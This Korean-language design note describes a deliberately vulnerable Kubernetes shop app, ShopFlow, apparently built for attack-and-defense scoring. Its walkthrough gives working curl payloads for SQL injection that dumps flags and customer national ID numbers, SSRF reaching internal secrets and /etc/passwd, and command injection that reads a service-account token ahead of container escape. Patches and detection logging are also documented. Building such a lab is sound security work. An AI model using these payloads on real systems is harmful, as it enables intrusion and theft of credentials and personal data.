# 웹 취약점 확장 — Phase A (ShopFlow 통합 취약 베이스라인)

별도 벤치마크 앱(`k8s/targets/`, 보정용)과 달리, ShopFlow 실제 엔드포인트에 웹 취약점을
"운영 실수"처럼 심어 **기존 킬체인 ①②③④와 같은 크라운 주얼(④ FLAG / PII / host.flag)로
수렴하는 대체 경로**로 만든다. 설계 전문: `docs/shopflow-vuln-expansion.md`.

현 상태: **Phase A 환경 구현 완료**(취약 코드 + 방어 레퍼런스 + `role` 컬럼). god-view 채점 배선
(`orchestrator/log_source.py`·`flags.py`)은 다음 단계.

## 심은 취약점 (Phase A)

| # | 취약점 | 엔드포인트 (심은 위치) | 도달 목표·브릿지 | flag_id | MITRE | god-view 신호 | 방어 |
|---|--------|------------------------|------------------|---------|-------|---------------|------|
| A1 | SQL Injection | `catalog-api GET /api/products?q=` | 공개 웹 → ④ `internal_secrets` + PII 직행 | `4` 값대조 + `sqli` | T1190/T1213 | catalog-api 쿼리 로그 UNION/구문오류 | app patch(파라미터화) |
| A2 | SSRF | `catalog-api POST /api/products/preview` | 내부 피벗(admin-dashboard `/internal/secret`→①②, `file://`) | `ssrf` | T1190 | catalog-api→internal/k8s/`file` 아웃바운드 | egress NP · app allowlist |
| A3 | OS Command Injection | `admin-dashboard GET /admin/diag?host=` | 내부 RCE → admin-sa 토큰 → T1610/T1611 → host.flag | `cmdi` | T1190/T1059 | Falco: admin-dashboard 파드 쉘 | app patch(shell=False) · Falco+PSA |
| B0 | Debug cred-leak | `catalog-api/order-api GET /debug/config` | 공개 웹 → DB 비번 평문 → ③NP → ④ | `1` 보강 | T1552.001 | 엔드포인트 접근 app 로그 | app patch(제거) |

## 수동 공격 walkthrough (발판에서 — 사람이 끝까지 뚫기)

> 발판: `kubectl -n frontend run attacker --rm -it --image=nicolaka/netshoot --restart=Never -- bash`
> (자동 루프에선 공격 하네스가 발판 파드에서 wget/curl 로 동일 수행)

**A1 — SQLi 로 공개 웹에서 ④ FLAG + PII 직행:**
```bash
# ④ FLAG (products 5컬럼에 맞춰 UNION; value → category 필드로 노출)
curl -sG "http://catalog-api.backend.svc.cluster.local:8080/api/products" \
  --data-urlencode "q=' UNION SELECT 1,key,value,1,1 FROM internal_secrets-- "
# → ... "category":"FLAG{...}" ...   (key=master_db_backup_credential)

# 고객 PII (주민번호)
curl -sG "http://catalog-api.backend.svc.cluster.local:8080/api/products" \
  --data-urlencode "q=' UNION SELECT id,name,ssn,1,1 FROM customers-- "
```

**B0 — debug 엔드포인트로 DB 비번 (① 대체경로):**
```bash
curl -s http://catalog-api.backend.svc.cluster.local:8080/debug/config | grep -o '"DB_PASSWORD":"[^"]*"'
# → "DB_PASSWORD":"devpassword123"   → ③ NP부재로 postgres 직접 접속 → ④
```

**A2 — SSRF 로 내부 admin 콘솔 경유 DB 비번 (①② 우회 도달):**
```bash
curl -s -XPOST http://catalog-api.backend.svc.cluster.local:8080/api/products/preview \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://admin-dashboard.internal.svc.cluster.local:8080/internal/secret/database/postgres-credentials"}' \
  | grep -o '"POSTGRES_PASSWORD":"[^"]*"'
# 로컬 파일 읽기도 가능:
curl -s -XPOST http://catalog-api.backend.svc.cluster.local:8080/api/products/preview \
  -H 'Content-Type: application/json' -d '{"url":"file:///etc/passwd"}'
```

**A3 — cmd injection 으로 admin-dashboard RCE → admin-sa 토큰 → 컨테이너 탈출:**
```bash
# admin-dashboard 는 내부 전용 → A2(SSRF) 로 먼저 닿거나, 발판에서 직접 호출:
curl -sG "http://admin-dashboard.internal.svc.cluster.local:8080/admin/diag" \
  --data-urlencode "host=127.0.0.1; cat /var/run/secrets/kubernetes.io/serviceaccount/token"
# → ping 출력 + admin-sa JWT. 이후 과권한 토큰으로 T1610/T1611 탈출은 README.md 의
#   '컨테이너 탈출 체인 walkthrough' 그대로 → /host/etc/shopflow/host.flag (T1005) 까지.
```

## 방어 검증 (방어자 패치가 실제로 막는지)

```bash
# 앱 패치 (patch_app):
kubectl apply -f k8s/killchain/defense-reference/app-hardened/catalog-api-code.yaml
kubectl -n backend rollout restart deploy/catalog-api
#   → A1 재시도: 빈 결과/구문오류(파라미터화) · A2 preview: 403(allowlist) · B0 /debug/config: 404
kubectl apply -f k8s/killchain/defense-reference/app-hardened/admin-dashboard-code.yaml
kubectl -n internal rollout restart deploy/admin-dashboard
#   → A3 /admin/diag?host=...;cmd : 400(invalid host) / 주입 미실행

# 보상통제(병행): A2 는 catalog-api egress NP 로도 내부 피벗 차단. A3 탈출은 Falco 탐지 + PSA.
```

## god-view 채점 (AppLogSource — 배선 완료)

- **달성(achievement)**: 경로 불문 — 공격자가 보고한 FLAG 문자열을 `registry.match_value` 가 ④와
  대조(SQLi 지름길이든 기존 체인이든 동일). 추가 배선 불필요.
- **탐지(detection)**: 앱 레벨 공격은 감사로그·Falco 사각 → 취약 서비스가 민감 요청마다 JSON
  감사 로그(`after_request` 훅: ts+path+query+url)를 stdout 에 찍고, `scripts/vmc-sync-applog.sh` 가
  VM C 로 당기면 `orchestrator/app_log_source.py` 의 `AppLogSource` 가 페이로드 악성 여부로 판정:
  `WEB_SQLI`(union/tautology) · `WEB_SSRF`(내부/file URL) · `WEB_CMDI`(셸 메타문자) ·
  `WEB_CREDLEAK`(/debug/config). `CompositeLogSource` 가 Audit+Falco+App 을 합쳐 truth 에 편입 →
  `scorer` 가 TP/FP/FN·MTTD 산출. 하드닝 버전도 '시도'는 로깅(탐지≠차단 유지).
- flag 정의: `orchestrator/flags.py` 비-digit `web-*` FlagSpec(선형 깊이 ①~④ 불변).
- config: `observability.app_log_path`. **남은 것(방어자 측)**: 방어자가 이 웹 공격을 '보고'해
  `patch_app` 을 걸려면 **방어 하네스(VM D)도 앱 로그를 수집**해야 함. 그 전까진 web 기법이
  god-view truth 엔 있으나 방어자 보고가 없어 FN 으로 잡힘(의도된 중간 상태) → 다음 작업.

## 리셋 반영 (TODO — 채점 단계와 함께)

- 신규/수정 ConfigMap(`catalog-api-code`·`order-api-code`·`admin-dashboard-code`)과 스키마(`role` 컬럼)는
  이미 `k8s/services/` 베이스라인에 포함 → 매니페스트 재적용 리셋으로 취약 베이스라인 복원됨.
- 방어자가 적용한 `app-hardened/*`·egress NP 는 에피소드 경계에서 되돌려야 함
  (`orchestrator/baseline.py` 재적용 집합에 서비스 ConfigMap 재적용 포함 — 채점 배선 때 확인).
